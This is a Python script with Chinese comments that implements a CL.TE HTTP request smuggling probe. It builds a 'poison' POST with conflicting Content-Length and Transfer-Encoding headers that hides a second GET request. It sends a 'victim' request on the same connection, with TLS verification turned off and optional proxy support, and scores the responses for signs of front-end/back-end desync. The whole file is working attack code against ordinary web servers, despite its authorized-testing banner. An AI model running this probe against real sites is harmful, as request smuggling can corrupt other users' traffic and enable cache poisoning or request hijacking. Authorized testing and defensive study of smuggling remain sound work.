import socket
import ssl
import time
import sys
import re
import base64
from urllib.parse import urlparse
from dataclasses import dataclass, field
from typing import Optional


# ─── 配置 ────────────────────────────────────────────────────────────────────
DEFAULT_TARGET = 'https://example.com'
DEFAULT_PATH = '/favicon.ico'
TIMEOUT_CONNECT = 10
TIMEOUT_READ = 4
PROBE_RETRIES = 3
PROBE_DELAY = 0.5
PROBE_INTERVAL = 1.0
SMUGGLED_MARKER = 'xprobe77f3a'
RESPONSE_SIZE_LIMIT = 1 * 1024 * 1024  # 1 MB


# ─── 数据结构 ─────────────────────────────────────────────────────────────────
@dataclass
class ProxyConfig:
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None


@dataclass
class BaselineResult:
    name: str
    request: str
    response: bytes
    elapsed: float
    status_code: Optional[str]
    error: Optional[str] = None


@dataclass
class ProbeResult:
    base_baseline: BaselineResult
    marker_baseline: BaselineResult
    poison: str
    victim: str
    response: bytes
    elapsed: float
    timed_out: bool
    error: Optional[str] = None


@dataclass
class AnalysisReport:
    indicators: list[str] = field(default_factory=list)
    confidence: str = 'LOW'
    verdict: str = ''

    def __str__(self):
        lines = [f'置信度: {self.confidence}', f'结论  : {self.verdict}']
        if self.indicators:
            lines.append('迹象  :')
            for item in self.indicators:
                lines.append(f'  • {item}')
        return '\n'.join(lines)


# ─── URL / 代理解析 ───────────────────────────────────────────────────────────
def parse_target(url: str):
    if not url:
        url = DEFAULT_TARGET

    parsed = urlparse(url)

    if not parsed.scheme:
        url = 'https://' + url
        parsed = urlparse(url)

    if parsed.scheme not in ('http', 'https'):
        raise ValueError('只支持 http 或 https URL')

    if not parsed.hostname:
        raise ValueError('URL 缺少主机名')

    use_tls = parsed.scheme == 'https'
    host = parsed.hostname
    port = parsed.port or (443 if use_tls else 80)
    sni = host

    hosthdr = host
    if parsed.port:
        default_port = 443 if use_tls else 80
        if parsed.port != default_port:
            hosthdr = f'{host}:{parsed.port}'

    path = parsed.path or DEFAULT_PATH
    if parsed.query:
        path += '?' + parsed.query

    return host, port, sni, hosthdr, path, use_tls


def parse_proxy(proxy_url: str) -> ProxyConfig:
    parsed = urlparse(proxy_url)

    if parsed.scheme and parsed.scheme.lower() != 'http':
        raise ValueError('当前仅支持 HTTP 代理')

    if not parsed.hostname:
        raise ValueError('代理地址缺少主机名')

    if not parsed.port:
        raise ValueError('代理地址缺少端口')

    return ProxyConfig(
        host=parsed.hostname,
        port=parsed.port,
        username=parsed.username,
        password=parsed.password,
    )


# ─── 路径构造 ─────────────────────────────────────────────────────────────────
def build_marker_path(base_path: str) -> str:
    path_only = base_path
    query = ''

    if '?' in base_path:
        path_only, query = base_path.split('?', 1)
        query = '?' + query

    sep = '' if path_only.endswith('/') else '/'
    return f'{path_only}{sep}{SMUGGLED_MARKER}{query}'


# ─── 请求构造 ─────────────────────────────────────────────────────────────────
def build_get_request(hosthdr: str, path: str) -> str:
    return (
        f'GET {path} HTTP/1.1\r\n'
        f'Host: {hosthdr}\r\n'
        'Connection: close\r\n'
        '\r\n'
    )


def build_poison(hosthdr: str, base_path: str) -> str:
    """
    CL.TE 走私载荷：
      前端如果信任 Content-Length: 5，会只读取 '0\\r\\n\\r\\n'。
      后端如果信任 Transfer-Encoding: chunked，会把 chunked 请求解析结束。
      后面的 GET /marker 被留在同一连接缓冲区中，等待 victim 请求拼接。
    """
    smuggled_path = build_marker_path(base_path)
    chunked_end = '0\r\n\r\n'
    cl = len(chunked_end.encode()) + len(smuggled_path.encode())  # 核心：CL 覆盖走私字节

    return (
        f'POST {base_path} HTTP/1.1\r\n'
        f'Host: {hosthdr}\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        f'Content-Length: {cl}\r\n'
        'Transfer-Encoding: chunked\r\n'
        '\r\n'
        f'{chunked_end}'
        f'GET {smuggled_path} HTTP/1.1\r\n'
        f'Host: {hosthdr}\r\n'
        # 故意省略末尾 \r\n\r\n，等待 victim 请求补全。
    )


def build_victim(hosthdr: str, base_path: str) -> str:
    return build_get_request(hosthdr, base_path)


# ─── 网络层 ───────────────────────────────────────────────────────────────────
def _connect_via_proxy(host: str, port: int, proxy: ProxyConfig) -> socket.socket:
    raw = socket.create_connection((proxy.host, proxy.port), timeout=TIMEOUT_CONNECT)
    raw.settimeout(TIMEOUT_CONNECT)

    connect_req = (
        f'CONNECT {host}:{port} HTTP/1.1\r\n'
        f'Host: {host}:{port}\r\n'
        'Proxy-Connection: keep-alive\r\n'
    )

    if proxy.username is not None:
        userpass = f'{proxy.username}:{proxy.password or ""}'
        token = base64.b64encode(userpass.encode()).decode()
        connect_req += f'Proxy-Authorization: Basic {token}\r\n'

    connect_req += '\r\n'

    try:
        raw.sendall(connect_req.encode())

        buf = b''
        while b'\r\n\r\n' not in buf:
            chunk = raw.recv(4096)
            if not chunk:
                break
            buf += chunk
            if len(buf) > 65536:
                break

        first_line = buf.split(b'\r\n', 1)[0].decode(errors='replace')
        m = re.match(r'^HTTP/[12]\.[01] (\d{3})', first_line)
        if not m or m.group(1) != '200':
            raise OSError(f'代理 CONNECT 失败: {first_line}')
    except Exception:
        raw.close()
        raise

    return raw


def create_socket(
    host: str,
    port: int,
    sni: str,
    use_tls: bool,
    proxy: Optional[ProxyConfig] = None,
) -> socket.socket:
    if proxy:
        raw = _connect_via_proxy(host, port, proxy)
    else:
        raw = socket.create_connection((host, port), timeout=TIMEOUT_CONNECT)

    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(raw, server_hostname=sni)

    return raw


def recv_all(sock: socket.socket) -> tuple[bytes, bool]:
    data = b''
    timed_out = False

    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break

            data += chunk

            if len(data) > RESPONSE_SIZE_LIMIT:
                break
    except socket.timeout:
        timed_out = True

    return data, timed_out


# ─── 基线请求 ─────────────────────────────────────────────────────────────────
def send_single_baseline(
    name: str,
    host: str,
    port: int,
    sni: str,
    hosthdr: str,
    path: str,
    use_tls: bool,
    proxy: Optional[ProxyConfig] = None,
) -> BaselineResult:
    req = build_get_request(hosthdr, path)
    start = time.monotonic()

    try:
        sock = create_socket(host, port, sni, use_tls, proxy=proxy)
        sock.settimeout(TIMEOUT_READ)
        sock.sendall(req.encode())
        data, _ = recv_all(sock)
        sock.close()
    except (socket.error, ssl.SSLError, OSError) as e:
        return BaselineResult(name, req, b'', 0.0, None, error=str(e))

    elapsed = time.monotonic() - start
    status_code = _first_status_code(data)

    return BaselineResult(name, req, data, elapsed, status_code)


def send_baselines(
    host: str,
    port: int,
    sni: str,
    hosthdr: str,
    base_path: str,
    use_tls: bool,
    proxy: Optional[ProxyConfig] = None,
) -> tuple[BaselineResult, BaselineResult]:
    marker_path = build_marker_path(base_path)

    base_baseline = send_single_baseline(
        '基础路径基线',
        host,
        port,
        sni,
        hosthdr,
        base_path,
        use_tls,
        proxy=proxy,
    )

    marker_baseline = send_single_baseline(
        '探测标记基线',
        host,
        port,
        sni,
        hosthdr,
        marker_path,
        use_tls,
        proxy=proxy,
    )

    return base_baseline, marker_baseline


# ─── 走私探测 ─────────────────────────────────────────────────────────────────
def send_probe(
    host: str,
    port: int,
    sni: str,
    hosthdr: str,
    base_path: str,
    use_tls: bool,
    proxy: Optional[ProxyConfig] = None,
) -> ProbeResult:
    """
    一轮完整流程：
      1. 单独请求基础路径，得到基础路径基线。
      2. 单独请求探测标记路径，得到标记路径基线。
      3. 新建连接，发送 CL.TE poison。
      4. 等待短暂时间后，在同一连接发送 victim 请求。
      5. 收集走私探测响应。
      6. 把走私响应与两个基线响应对比。
    """
    base_baseline, marker_baseline = send_baselines(
        host,
        port,
        sni,
        hosthdr,
        base_path,
        use_tls,
        proxy=proxy,
    )

    poison = build_poison(hosthdr, base_path)
    victim = build_victim(hosthdr, base_path)

    start = time.monotonic()

    try:
        sock = create_socket(host, port, sni, use_tls, proxy=proxy)
    except (socket.error, ssl.SSLError, OSError) as e:
        return ProbeResult(
            base_baseline,
            marker_baseline,
            poison,
            victim,
            b'',
            0.0,
            False,
            error=str(e),
        )

    try:
        sock.settimeout(TIMEOUT_READ)
        sock.sendall(poison.encode())
        time.sleep(PROBE_DELAY)
        sock.sendall(victim.encode())
        data, timed_out = recv_all(sock)
        sock.close()
    except (socket.error, ssl.SSLError, OSError) as e:
        try:
            sock.close()
        except Exception:
            pass

        return ProbeResult(
            base_baseline,
            marker_baseline,
            poison,
            victim,
            b'',
            time.monotonic() - start,
            False,
            error=str(e),
        )

    elapsed = time.monotonic() - start

    return ProbeResult(
        base_baseline,
        marker_baseline,
        poison,
        victim,
        data,
        elapsed,
        timed_out,
    )


def run_probes(
    host: str,
    port: int,
    sni: str,
    hosthdr: str,
    base_path: str,
    use_tls: bool,
    retries: int = PROBE_RETRIES,
    proxy: Optional[ProxyConfig] = None,
) -> list[ProbeResult]:
    results = []

    for i in range(retries):
        print(f'  [探测 {i + 1}/{retries}] ', end='', flush=True)

        result = send_probe(
            host,
            port,
            sni,
            hosthdr,
            base_path,
            use_tls,
            proxy=proxy,
        )

        if result.error:
            status = f'错误: {result.error}'
        elif result.timed_out:
            status = '超时'
        else:
            probe_status = _first_status_code(result.response) or '?'
            status = (
                f'{len(result.response)}B  '
                f'基础基线→{result.base_baseline.status_code or "?"}  '
                f'标记基线→{result.marker_baseline.status_code or "?"}  '
                f'探测→{probe_status}  '
                f'耗时 {result.elapsed:.2f}s'
            )

        print(status)
        results.append(result)

        if i < retries - 1:
            time.sleep(PROBE_INTERVAL)

    return results


# ─── 响应分析 ─────────────────────────────────────────────────────────────────
def _first_status_code(data: bytes) -> Optional[str]:
    for line in data.decode(errors='replace').split('\r\n'):
        m = re.match(r'^HTTP/[12]\.[01] (\d{3})', line)
        if m:
            return m.group(1)
    return None


def _all_status_lines(text: str) -> list[str]:
    return [
        line for line in text.split('\r\n')
        if re.match(r'^HTTP/[12]\.[01] \d{3}', line)
    ]


def _baseline_summary(bl: BaselineResult) -> str:
    if bl.error:
        return f'{bl.name}失败（{bl.error}）'

    return (
        f'{bl.name}: HTTP {bl.status_code or "?"} | '
        f'{len(bl.response)}B | {bl.elapsed:.2f}s'
    )


def _size_delta(a: bytes, b: bytes) -> int:
    return abs(len(a) - len(b))


def _body_part(data: bytes) -> bytes:
    marker = b'\r\n\r\n'
    if marker not in data:
        return data
    return data.split(marker, 1)[1]


def _rough_similarity(a: bytes, b: bytes) -> float:
    """
    简单粗略相似度，用于辅助判断响应更接近哪个基线。
    不是严格算法，只作为弱指标。
    """
    if not a or not b:
        return 0.0

    a_body = _body_part(a)[:4096]
    b_body = _body_part(b)[:4096]

    if not a_body or not b_body:
        return 0.0

    a_tokens = set(re.findall(rb'[A-Za-z0-9_\-/]{4,}', a_body))
    b_tokens = set(re.findall(rb'[A-Za-z0-9_\-/]{4,}', b_body))

    if not a_tokens or not b_tokens:
        return 0.0

    common = len(a_tokens & b_tokens)
    total = len(a_tokens | b_tokens)

    return common / total if total else 0.0


def analyze_response(result: ProbeResult, base_path: str) -> AnalysisReport:
    """
    加分制：
      +3  走私标记出现在探测响应中
      +3  探测响应状态码等于标记路径基线，且不同于基础路径基线
      +2  检测到 >=2 个 HTTP 响应
      +2  探测响应比基础路径更接近标记路径基线
      +2  基础路径基线与探测状态码不一致
      +1  响应超时
      +1  响应大小与基础路径基线差异 > 50B
      +1  响应大小与标记路径基线接近
      +1  收到 400 / 502 / 503

    总分 >=5 → HIGH
    总分 >=2 → MEDIUM
    其他 → LOW
    """
    report = AnalysisReport()

    report.indicators.append(_baseline_summary(result.base_baseline))
    report.indicators.append(_baseline_summary(result.marker_baseline))

    if result.error:
        report.verdict = f'连接失败: {result.error}'
        return report

    score = 0

    if not result.response and result.timed_out:
        score += 1
        report.indicators.append(
            f'探测响应超时（{result.elapsed:.1f}s）且无字节返回，后端可能在等待剩余数据'
        )
    elif not result.response:
        report.verdict = '服务器关闭连接，探测请求未返回任何数据'
        return report

    text = result.response.decode(errors='replace')
    probe_status = _first_status_code(result.response)
    status_lines = _all_status_lines(text)

    base_status = result.base_baseline.status_code
    marker_status = result.marker_baseline.status_code

    base_len = len(result.base_baseline.response)
    marker_len = len(result.marker_baseline.response)
    probe_len = len(result.response)

    if SMUGGLED_MARKER in text:
        score += 3
        report.indicators.append(
            f'探测响应中出现走私标记 {SMUGGLED_MARKER}，说明标记路径可能被后端处理'
        )

    if len(status_lines) >= 2:
        score += 2
        codes = ', '.join(line.split()[1] for line in status_lines[:4])
        report.indicators.append(
            f'检测到 {len(status_lines)} 个 HTTP 响应（{codes}），可能存在响应错位'
        )

    if (
        probe_status
        and marker_status
        and base_status
        and probe_status == marker_status
        and probe_status != base_status
    ):
        score += 3
        report.indicators.append(
            f'探测状态码 HTTP {probe_status} 与标记路径基线一致，但不同于基础路径基线 HTTP {base_status}'
        )

    if probe_status and base_status and probe_status != base_status:
        score += 2
        report.indicators.append(
            f'探测状态码 HTTP {probe_status} 与基础路径基线 HTTP {base_status} 不一致'
        )

    base_similarity = _rough_similarity(result.response, result.base_baseline.response)
    marker_similarity = _rough_similarity(result.response, result.marker_baseline.response)

    if marker_similarity > base_similarity and marker_similarity >= 0.15:
        score += 2
        report.indicators.append(
            f'探测响应内容更接近标记路径基线，相似度 标记={marker_similarity:.2f} 基础={base_similarity:.2f}'
        )
    else:
        report.indicators.append(
            f'响应粗略相似度 标记={marker_similarity:.2f} 基础={base_similarity:.2f}'
        )

    base_delta = abs(probe_len - base_len)
    marker_delta = abs(probe_len - marker_len)

    if base_delta > 50:
        score += 1
        report.indicators.append(
            f'探测响应大小 {probe_len}B 与基础路径基线 {base_len}B 差异 {base_delta}B'
        )

    if marker_len and marker_delta < base_delta:
        score += 1
        report.indicators.append(
            f'探测响应大小更接近标记路径基线：探测 {probe_len}B，标记基线 {marker_len}B，基础基线 {base_len}B'
        )

    if result.timed_out:
        score += 1
        report.indicators.append(
            f'读取探测响应超时（{result.elapsed:.1f}s），可能存在后端等待或连接未正常收束'
        )

    if probe_status in ('400', '502', '503'):
        score += 1
        report.indicators.append(
            f'探测响应状态码为 HTTP {probe_status}，可能是前后端解析冲突、代理错误或后端异常'
        )

    if score >= 5:
        report.confidence = 'HIGH'
        report.verdict = '发现多个强迹象，目标可能存在 CL.TE 请求走私行为'
    elif score >= 2:
        report.confidence = 'MEDIUM'
        report.verdict = '发现部分异常迹象，需要结合多轮结果和原始响应人工确认'
    else:
        report.confidence = 'LOW'
        report.verdict = '未发现足够证据证明存在 CL.TE 请求走私'

    return report


def aggregate_reports(results: list[ProbeResult], base_path: str) -> AnalysisReport:
    reports = [analyze_response(r, base_path) for r in results]

    high = sum(1 for r in reports if r.confidence == 'HIGH')
    medium = sum(1 for r in reports if r.confidence == 'MEDIUM')
    low = sum(1 for r in reports if r.confidence == 'LOW')

    final = AnalysisReport()

    final.indicators.append(f'总探测轮数: {len(results)}')
    final.indicators.append(f'HIGH: {high} | MEDIUM: {medium} | LOW: {low}')

    marker_hits = 0
    multi_response_hits = 0
    timeout_hits = 0

    for result in results:
        text = result.response.decode(errors='replace') if result.response else ''

        if SMUGGLED_MARKER in text:
            marker_hits += 1

        if len(_all_status_lines(text)) >= 2:
            multi_response_hits += 1

        if result.timed_out:
            timeout_hits += 1

    if marker_hits:
        final.indicators.append(f'{marker_hits} 轮响应中出现走私标记 {SMUGGLED_MARKER}')

    if multi_response_hits:
        final.indicators.append(f'{multi_response_hits} 轮检测到多个 HTTP 响应')

    if timeout_hits:
        final.indicators.append(f'{timeout_hits} 轮出现读取超时')

    if high >= 1 or medium >= 2:
        final.confidence = 'HIGH' if high >= 1 else 'MEDIUM'
        final.verdict = '多轮探测存在可疑行为，建议结合原始请求响应进一步验证'
    elif medium == 1:
        final.confidence = 'MEDIUM'
        final.verdict = '单轮出现可疑行为，可能是网络、WAF 或后端异常造成，建议复测'
    else:
        final.confidence = 'LOW'
        final.verdict = '多轮探测未发现稳定的 CL.TE 请求走私迹象'

    return final


# ─── 输出辅助 ─────────────────────────────────────────────────────────────────
def section(title: str, body: str):
    print()
    print('─' * 72)
    print(title)
    print('─' * 72)
    print(body)


# ─── 主程序 ───────────────────────────────────────────────────────────────────
def main():
    print('╔════════════════════════════════════════════════════════════╗')
    print('║      CL.TE HTTP Request Smuggling 探测工具                ║')
    print('║  仅供授权渗透测试使用，请勿对未授权目标使用               ║')
    print('╚════════════════════════════════════════════════════════════╝')

    proxy_input = input(
        '\n输入 HTTP 代理地址（如 http://127.0.0.1:8080 或 '
        'http://user:pass@host:port，直接回车不使用代理）: '
    ).strip()

    proxy: Optional[ProxyConfig] = None

    if proxy_input:
        try:
            proxy = parse_proxy(proxy_input)
            print(
                f'代理     : {proxy.host}:{proxy.port}'
                + (f'  (认证用户: {proxy.username})' if proxy.username else '')
            )
        except ValueError as e:
            print(f'[!] 代理地址解析失败，将不使用代理: {e}')
            proxy = None
    else:
        print('代理     : 不使用（直连）')

    probe_input = input(
        f'\n输入探测目标 URL（直接回车使用默认 {DEFAULT_TARGET}）: '
    ).strip()

    try:
        host, port, sni, hosthdr, base_path, use_tls = parse_target(probe_input)
    except ValueError as e:
        print(f'[!] 输入错误: {e}')
        sys.exit(1)

    marker_path = build_marker_path(base_path)

    print(f'\n探测目标 : {host}:{port}  (TLS: {use_tls})')
    print(f'基础路径 : {base_path}')
    print(f'标记路径 : {marker_path}')
    print(f'SNI      : {sni}')
    print(f'Host 头  : {hosthdr}')
    print(f'标记     : {SMUGGLED_MARKER}')
    print(f'探测轮数 : {PROBE_RETRIES}')

    if proxy:
        print(f'代理     : {proxy.host}:{proxy.port}')

    print()
    print('[*] 开始探测。每轮会先单独请求基础路径和标记路径，再发送 CL.TE 走私探测。')

    results = run_probes(
        host,
        port,
        sni,
        hosthdr,
        base_path,
        use_tls,
        proxy=proxy,
    )

    first = results[0]

    base_resp_text = (
        first.base_baseline.response.decode(errors='replace')
        if first.base_baseline.response else '（无响应）'
    )

    section(
        f'基础路径基线请求（{base_path}）',
        first.base_baseline.request,
    )

    section(
        f'基础路径基线响应（HTTP {first.base_baseline.status_code or "?"}  '
        f'{len(first.base_baseline.response)}B  {first.base_baseline.elapsed:.2f}s）',
        base_resp_text,
    )

    marker_resp_text = (
        first.marker_baseline.response.decode(errors='replace')
        if first.marker_baseline.response else '（无响应）'
    )

    section(
        f'探测标记基线请求（{marker_path}）',
        first.marker_baseline.request,
    )

    section(
        f'探测标记基线响应（HTTP {first.marker_baseline.status_code or "?"}  '
        f'{len(first.marker_baseline.response)}B  {first.marker_baseline.elapsed:.2f}s）',
        marker_resp_text,
    )

    if not first.error:
        section('Poison payload（CL.TE 走私载荷）', repr(first.poison))
        section('Victim request', repr(first.victim))

        probe_resp_text = (
            first.response.decode(errors='replace')
            if first.response else '（无响应）'
        )

        section(
            f'走私探测响应（{len(first.response)}B  {first.elapsed:.2f}s  '
            f'超时: {first.timed_out}）',
            probe_resp_text,
        )
    else:
        section('走私探测错误', first.error)

    first_report = analyze_response(first, base_path)
    section('第一轮分析报告', str(first_report))

    aggregate = aggregate_reports(results, base_path)
    section('多轮汇总报告', str(aggregate))


if __name__ == '__main__':
    main()